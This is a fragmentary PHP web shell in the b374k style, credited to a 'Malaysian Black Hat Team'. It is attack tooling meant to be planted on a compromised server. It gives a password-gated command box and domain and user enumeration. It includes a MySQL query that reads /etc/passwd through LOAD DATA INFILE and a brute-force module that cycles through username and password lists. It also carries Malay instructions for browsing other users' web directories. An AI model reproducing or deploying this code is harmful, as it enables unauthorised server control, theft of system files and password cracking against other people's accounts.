<?
$auth_pass='e7aebb66ffc168abdbc07ca170ceb8a6';
$color = "#00ff00";
...
<a href="?<?php echo "y=".$pwd; ?>&amp;x=readable"><b>Readable</b></a> 
<a href="?<?php echo "y=".$pwd; ?>&amp;x=dos"><b>DOS</b></a> 
<a href="?<?php echo "y=".$pwd; ?>&amp;x=localdomain"><b>LocalDomain</b></a> 
<a href="http://1337day.com/" target="_blank"><b>Exploit</b></a>
<a href="http://zone-h.org/" target="_blank"><b>Zone-H</b></a> </div> 
     <!-- menu end --> 
...
<table class="cmdbox"> <tr><td> <textarea class="output" name="cmd" id="cmd"> 
<?php 
         ...
         { 
              ...
              </textarea> <tr><td><input style="width:19%;" class="inputzbut" type="submit" value="Go !" name="submitcmd" />
              </td></tr></form> </table> </form> <?php 
         } 
...
elseif(isset($_GET['x']) && ($_GET['x'] == 'mysql'))
         ...
         if(isset($_GET['sqlhost']) && isset($_GET['sqluser']) && isset($_GET['sqlpass']) && isset($_GET['sqlport']))
              ...
              if(isset($_GET['table'])) 
                   ...
                   $msg .= "</div>"; 
                   echo $msg; 
              if(isset($_GET['db']) && (!isset($_GET['table'])) && (!isset($_GET['sqlquery']))){ $db = $_GET['db']; 
                   $query = "DROP TABLE IF EXISTS b374k_table;
                   \nCREATE TABLE `b374k_table` ( `file` LONGBLOB NOT NULL );
                   \nLOAD DATA INFILE \"/etc/passwd\"\nINTO TABLE b374k_table;SELECT * FROM b374k_table;
                   \nDROP TABLE IF EXISTS b374k_table;"; 
                   $msg = "<div style=\"width:99%;padding:0 10px;\"><form action=\"?\" method=\"get\"> <input type=\"hidden\"  
                           name=\"y\" value=\"".$pwd."\" /> <input type=\"hidden\" name=\"x\" value=\"mysql\" /> <input 
                           type=\"hidden\" name=\"sqlhost\" value=\"".$sqlhost."\" /> <input type=\"hidden\" name=\"sqluser\" 
                           value=\"".$sqluser."\" /> <input type=\"hidden\" name=\"sqlport\" value=\"".$sqlport."\" /> <input 
                           type=\"hidden\" name=\"sqlpass\" value=\"".$sqlpass."\" /> <input type=\"hidden\" name=\"db\" 
                           value=\"".$db."\" /> <p><textarea name=\"sqlquery\" class=\"output\" 
                           style=\"width:98%;height:80px;\">$query</textarea></p> <p><input class=\"inputzbut\" style=\"width:80px;\" 
...
//bruteforce
// [Newbie3viLc063s + h3x4Crew + RileksCrew Family]
...
$data = curl_exec($ch);
if ( curl_errno($ch) == 28 ) { 
print "<b> Failed! : NEXT TARGET!</b>";
exit;}
elseif ( curl_errno($ch) == 0 ){

print 
"<b>[ Newbie3viLc063s@hotmail.co.uk ]# </b>
<b>Selesai , Username = <font color='#FF0000'> $asu </font> Password = 
...
$userlist = explode ("\n" , $hn );
$passlist = explode ("\n" , $crew );
print "<b>[ Newbie3viLc063s@hotmail.co.uk ]# </b> ATTACK...!!! </font></b><br>";
...
echo "\n";
echo "[+] Copy salah satu directories public_html di atas, lalu Paste ke --> view file/folder <-- yang ada di menu --> Explorer \n";
echo "[+] Selesai...\n";
echo '</textarea><br><br>Coded by <b>Malaysian Black Hat Team</b> & <b>Newbie3viLc063s</b> <a href=http://Newbie3viLc063s.blogspot.com/>Homepage</a></body></html>';
...
echo "<br><br>";
   ...
   echo "<table align=center border=1 width=59% cellpadding=5>
         <tr><td colspan=2>[+] Disini : [ <b>".count($domains)."</b> ] Domain Tersenarai...</td></tr>
         <tr><td><b>Senarai Domain</b></td><td><b>Senarai User</b></td></tr>";
...
}else{ echo '<center><form action=? method=GET><input type="hidden" name="act" value="phptools">
